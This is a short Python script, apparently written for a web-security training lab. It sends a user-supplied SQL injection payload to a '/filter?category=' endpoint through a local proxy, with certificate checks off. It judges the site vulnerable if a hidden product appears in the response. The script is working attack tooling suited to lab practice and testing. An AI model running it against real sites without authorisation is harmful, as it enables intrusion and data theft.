import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli(url, payload):
     uri = '/filter?category='
     req = requests.get(url + uri + payload, proxies=proxies, verify=False)
     if "Birdsong" in req.text:
         return True
     else:
         return False
         

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://example.com '1=1'" % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] The site is vulnerable to SQL Injection")
    else:
        print("[-] The site is not vulnerable to SQL Injection")
        